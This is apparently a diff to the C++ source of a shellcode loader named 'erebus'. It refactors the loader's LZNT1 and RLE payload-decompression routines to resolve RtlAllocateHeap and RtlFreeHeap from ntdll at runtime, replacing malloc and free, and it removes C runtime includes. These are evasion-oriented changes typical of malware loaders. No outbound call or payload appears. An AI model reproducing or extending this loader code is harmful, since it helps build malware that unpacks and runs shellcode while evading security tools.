@@ -1,7 +1,6 @@
 #include "../include/loader.hpp"
 #include "../include/config.hpp"
-#include <intrin.h>
-#include <cstdlib>
+
 
 // NOTE: shellcode.hpp is NOT included here to prevent linker errors.
 
@@ -102,6 +101,15 @@ namespace erebus {
 		return (HMODULE)module_handle;
 	}
 
+	VOID RtlFreeHeapC(_In_ HANDLE HeapHandle, _In_ ULONG Flags, _In_ PVOID HeapBase) {
+		HMODULE ntdll = ImportModule("ntdll.dll");
+		if (!ntdll) return;
+		ImportFunction(ntdll, RtlFreeHeap, typeRtlFreeHeap);
+		if (!RtlFreeHeap) return;
+		RtlFreeHeap(HeapHandle, Flags, HeapBase);
+	}
+	
+
 	VOID CleanupModule(_In_ HMODULE module_handle) { return; }
 
 	// ============================================================
@@ -112,26 +120,33 @@ namespace erebus {
 	{
 		HMODULE ntdll = ImportModule("ntdll.dll");
 		if (!ntdll) return;
+		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
+		ImportFunction(ntdll, RtlFreeHeap, typeRtlFreeHeap);
 		ImportFunction(ntdll, RtlDecompressBuffer, typeRtlDecompressBuffer);
-		if (!RtlDecompressBuffer) return;
+		if (!RtlDecompressBuffer || !RtlFreeHeap || !RtlAllocateHeap) return;
 
 		SIZE_T OutputLen = (*InputLen) * 4;
-		BYTE* Output = (BYTE*)malloc(OutputLen);
+		BYTE* Output = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, OutputLen);
 		if (!Output) return;
 
 		ULONG FinalOutputSize;
 		if (NT_SUCCESS(RtlDecompressBuffer(0x0002, Output, (ULONG)OutputLen, *Input, (ULONG)*InputLen, &FinalOutputSize))) {
 			// Only free if it was heap allocated (Main ensures this by copying first)
-			free(*Input);
+			RtlFreeHeap(RtlProcessHeap(), 0, *Input);
 			*Input = Output;
 			*InputLen = FinalOutputSize;
 		} else {
-			free(Output);
+			RtlFreeHeap(RtlProcessHeap(), 0, Output);
 		}
 	}
 
 	VOID DecompressionRLE(_Inout_ BYTE** Input, _Inout_ SIZE_T* InputLen)
 	{
+		HMODULE ntdll = ImportModule("ntdll.dll");
+		if (!ntdll) return;
+		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
+		ImportFunction(ntdll, RtlFreeHeap, typeRtlFreeHeap);
+
 		if (!Input || !*Input || !InputLen || *InputLen == 0)
 		{
 			LOG_ERROR("Invalid input buffer for RLE decompression");
@@ -145,7 +160,7 @@ namespace erebus {
 			return;
 		}
 
-		BYTE* Output = (BYTE*)malloc(OutputCapacity);
+		BYTE* Output = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, OutputCapacity);
 		if (!Output)
 		{
 			LOG_ERROR("Failed to allocate RLE output buffer");
@@ -181,7 +196,7 @@ namespace erebus {
 		BYTE* OldInput = *Input;
 		*Input = Output;
 		*InputLen = OutputIndex;
-		free(OldInput);
+		RtlFreeHeap(RtlProcessHeap(), 0, OldInput);
 		return;
 	}
 
